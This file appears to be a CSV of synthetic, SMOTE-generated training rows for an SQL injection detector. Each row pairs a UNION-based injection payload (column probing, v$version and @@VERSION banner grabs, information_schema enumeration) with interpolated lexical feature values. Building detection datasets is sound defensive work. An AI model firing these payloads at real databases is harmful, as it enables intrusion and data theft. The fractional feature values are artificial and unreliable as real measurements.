id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000437,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.21901597458648248,100.56319089491691,27.0,4.11440465399546,29.0,42.72283635103726,15.0,13.840354543879657,0.28917687488881993,0.4235467913666499,0.14957424563214827,0.1377020881123819,1.1596454561203426,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.680709087759315,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000438,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000037,0.023391698453676033,55.85981149924426,20.97196229984885,4.020447046222784,14.0,27.887849199395404,4.0,9.971962299848851,0.2508548079314375,0.49897423048227507,0.07167280226612499,0.1784981593201625,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,4.971962299848851,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000439,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000014,0.5189894740162454,100.50335294304041,28.0,4.160325124195548,60.33705882560046,3.9168529412800233,23.166294117439953,13.083147058719977,0.598876297589022,0.03892455511652665,0.2314874979328835,0.1307116493615677,3.0,2.0,2.0,0.0,1.0,1.9168529412800228,3.469446951953614e-18,0.16629411743995393,0.0,3.469446951953614e-18,1.0,5.916852941280023,1.0,1.0,1.0,0.0,0.0,1.0,0.08314705871997685,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.916852941280023,1.9168529412800233,3.469446951953614e-18,0.08314705871997699,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.916852941280023
SMOTE_000440,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,0.025942319599530337,83.9642539741769,28.022341266139435,3.985604054856535,42.0,3.0,24.964253974176902,14.0,0.5002351712225204,0.03573108365875144,0.29728868804455466,0.16674505707417345,3.0,1.9910634935442255,2.0,0.0,1.0,1.0,3.469446951953614e-18,1.9910634935442255,0.0,3.469446951953614e-18,1.0,5.0,1.0,0.9955317467721126,1.0,0.0,0.0,1.0,0.9955317467721126,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000441,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,1.4368482150732982,58.213887940741245,19.89305602962938,3.788135638375792,14.0,30.213887940741238,4.0,10.0,0.24077546691357818,0.5184490661728437,0.06879299054673661,0.17198247636684155,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.4465280148146904,3.469446951953614e-18,5.553471985185309,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000442,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,0.1221224032004573,95.96944991030391,30.951527504484805,4.339092413434477,37.0,28.775559928243126,17.0,13.193889982060782,0.3861904213564078,0.29899621013222766,0.17743884224483603,0.13737452626652846,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.193889982060781,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000443,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000045,1.3260222256419092,71.16997168613779,25.16997168613779,4.135284851592035,28.16997168613779,24.146246460767223,11.146246460767223,7.707507078465554,0.3949283484439423,0.33958936479604374,0.15666072595351466,0.10882156080649934,1.4387393823016705,0.0,0.8537535392327766,0.0,0.0,0.14624646076722347,3.469446951953614e-18,0.8537535392327766,0.0,3.469446951953614e-18,3.5612606176983297,1.0,1.0,0.0,0.0,0.8537535392327765,0.0,0.14624646076722336,0.8537535392327765,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,0.14624646076722347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.146246460767223
SMOTE_000444,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000015,0.9189480389865565,51.71928864448266,21.14385772889653,4.102419996940906,37.20878249106908,1.15086183117225,8.215786593344797,5.143857728896532,0.7233413495834722,0.0188665873962664,0.15855056480383264,0.09924149821642875,0.07192886444826563,0.0,0.21578659334479688,0.0,0.9280711355517344,0.0,3.469446951953614e-18,1.0,0.0,0.9280711355517344,1.0719288644482656,1.1438577288965313,0.07192886444826563,0.0,0.07192886444826563,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,0.9280711355517344,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9280711355517345,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8561422711034687
SMOTE_000445,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,0.4755017384151083,98.57645815867401,31.3576458158674,4.365852063883712,37.0,30.861166526939215,17.0,13.715291631734804,0.3762076238725876,0.3119468663274539,0.17285215150902675,0.13899335829093173,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.7152916317348033,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000446,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.8145858954642574,75.81787637714254,32.81787637714253,4.436979329780167,41.635752754285065,3.0,17.0,14.182123622857468,0.5491169125413472,0.03956953874887237,0.22422738624361,0.18708616246617052,3.0,0.0,2.0,0.0,1.1821236228574674,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,5.364247245714934,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.8178763771425328,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.817876377142532
SMOTE_000447,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,0.723111387170685,102.73309353252868,26.0,4.0672706909409735,66.0,4.0,24.0,8.73309353252868,0.6424534386877125,0.038936572041679496,0.23361943225007725,0.08499055702053074,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.733093532528679,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.7330935325286787,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000448,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000009,0.7567908216344297,102.84647903854984,26.692958077099696,4.1078132189103185,62.61408384580061,4.846479038549848,24.0,11.385916154199393,0.6088681644514917,0.04711164532437512,0.23336041338994895,0.11065977683418421,2.5394371156495446,0.0,2.0,0.0,1.153520961450152,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.846479038549848,0.8464790385498481,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.8464790385498481,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000449,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,1.663840409492213,38.75350046168518,21.550700092337035,4.171436697523671,14.0,14.20280036934814,4.0,6.550700092337036,0.3627716758376745,0.36467398899479064,0.10364905023933556,0.16890528492819934,0.5507000923370353,0.4492999076629648,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,1.5507000923370353,3.0,0.5507000923370352,0.4492999076629648,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000450,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,0.7114732838174008,69.64680517268451,20.331527742971318,3.585611497170384,14.0,37.32611097188527,5.657638714856594,12.663055485942637,0.20333070378485138,0.5379198240233791,0.07693129037358766,0.18181818181818182,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.3315277429713188,1.0,3.469446951953614e-18,7.331527742971319,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.16576387148565924,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000451,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,0.7349267625425806,78.37366712422894,28.12526657515421,4.237897491949473,29.0,23.498933699383162,15.0,10.87473342484579,0.3714870742273746,0.2978519548374799,0.19214848666933168,0.13851248426581386,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.8747334248457899,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000452,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,2.3748465484201597,65.45860010995715,24.458600109957146,4.149206683873139,27.0,20.0,11.0,7.458600109957146,0.4124983209862837,0.30555431184169163,0.1680548715129304,0.11389249565909429,1.0,0.0,1.917200219914293,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.0,1.9172002199142928,1.0,0.0,0.4586001099571465,0.5413998900428535,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000453,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,0.36929961184000004,111.26451044140696,27.836557875868213,3.983262217765846,66.0,4.0,31.34623150347285,9.918278937934106,0.5934936122457647,0.03596930983307661,0.2814072117080389,0.08912986621311983,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,1.8365578758682126,0.0,3.469446951953614e-18,1.0,6.081721062065894,0.0,0.0,1.0,0.0,0.0,1.0,0.9182789379341063,3.469446951953614e-18,0.0,0.0,0.08172106206589373,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000454,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000013,0.6500853082632466,109.9583063921217,27.0,4.031849791895673,63.739576598030425,5.869788299015212,28.34894149507607,12.0,0.5798794186377668,0.05333654008903688,0.25758257855172867,0.10920146272146763,3.0,0.0,2.0,0.0,1.0,2.869788299015213,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.130211700984787,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.13021170098478685,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.869788299015213,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.869788299015212
SMOTE_000455,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,0.18780393734331172,88.57276266853924,28.0,4.251164413159031,29.0,30.858210134831396,15.0,13.714552533707849,0.3283540566833129,0.34709785285060296,0.16983830518102389,0.1547097852850603,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.7145525337078493,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000456,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,2.0100556411517925,75.54989454064172,33.09978908128342,4.447015689133216,41.09978908128342,3.0,17.0,14.450105459358289,0.5439453332404541,0.03971058182071491,0.22502663031738437,0.19131745462144667,3.0,0.0,2.0,0.0,1.4501054593582892,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,5.900210918716579,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.5498945406417108,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.549894540641711
SMOTE_000457,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.18328178473480025,101.20697504541987,26.0,4.034201716465083,62.82790018167946,4.793024954580133,24.793024954580133,8.793024954580135,0.6207324272503975,0.04737532956566626,0.24499331627616938,0.0868989269077669,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.793024954580135,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000458,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000068,0.5391427051812483,112.52811724186482,29.011246896745927,4.228186649797946,37.0,42.022493793491854,17.0,16.505623448372962,0.3289691432451385,0.3732292195738744,0.1511479847342528,0.1466536524467343,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.505623448372964,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000459,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000046,0.9193308551398389,89.34542730954377,27.0,3.8650134773641707,25.0,32.080359839615795,22.0,10.265067469927962,0.28246302372502213,0.35448488535890915,0.24856746087801948,0.11448463003804923,0.0,0.24497751002401286,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,4.020089959903949,4.0,0.0,0.24497751002401286,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000460,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R000044,0.36461252939730154,40.022919914845865,18.586248051092483,3.799588909745356,14.0,15.218335931876691,4.0,6.804583982969173,0.3507311119188062,0.37912266569743264,0.1002088891196589,0.16993733326410235,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,1.8045839829691728,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000461,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,0.554549585552577,64.9708258754118,23.0,4.0067217424998995,27.0,19.176660700329435,11.0,7.794165175082359,0.42092444876824153,0.28865474371858063,0.17148773838706138,0.11893306912611645,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.7941651750823593,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000462,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.4075018234338407,102.24534680961284,26.22642669265688,4.023289847771216,62.45285338531376,4.886786653671557,25.79249342429908,9.11321334632844,0.6110790920898774,0.04794366318712545,0.2518483173279602,0.08912892739503685,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.22642669265687965,0.0,3.469446951953614e-18,1.0,6.88678665367156,0.0,0.0,1.0,0.0,0.0,1.0,0.11321334632843971,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000463,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000046,0.06800501446374049,93.97767482137941,27.0,3.8511435058331718,25.0,36.08930071448238,21.866048928276438,11.022325178620594,0.2660212914053437,0.3840308823600646,0.23265840233214807,0.11728942390244365,0.022325178620593578,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.9776748213794066,0.0,3.469446951953614e-18,5.022325178620593,4.0,0.022325178620593467,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000464,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,1.433922937777874,61.873006533013864,19.749202613205547,3.7044853284184596,14.0,33.498405226411094,4.0,10.374601306602774,0.22660972013789893,0.5410174626995441,0.06474563432511397,0.16762718283744302,0.3746013066027739,0.6253986933972261,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,6.374601306602774,3.0,0.3746013066027739,0.625398693397226,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000465,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,3.356118041696458,96.92596059043325,27.521260718872842,4.0002630279314,52.532264184797455,4.436217843381474,26.914957124508632,13.042521437745686,0.536660215221449,0.04449425322530498,0.2802131471147462,0.1386323844384998,3.0,1.0425214377456855,2.0,0.0,1.0,1.9574785622543143,3.469446951953614e-18,1.0425214377456855,0.0,3.469446951953614e-18,1.0,5.478739281127157,1.0,0.5212607188728429,1.0,0.0,0.0,1.0,0.5212607188728428,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.4787392811271571,1.4787392811271571,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.957478562254314
SMOTE_000466,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,6.300662674159639,67.87916649579586,24.93187497436938,4.204354343878935,27.356041675210207,19.45499979495502,11.0,10.068125025630621,0.41308257703134,0.26630504793681037,0.16565555601121107,0.15495681902063854,1.3560416752102074,0.0,0.6439583247897926,0.7120833504204152,0.0,0.0,0.3560416752102074,1.3560416752102076,0.0,0.3560416752102074,4.643958324789793,1.3560416752102076,1.0,0.0,0.0,0.6439583247897924,0.0,0.0,1.0,0.3560416752102074,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3560416752102076,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.356041675210207
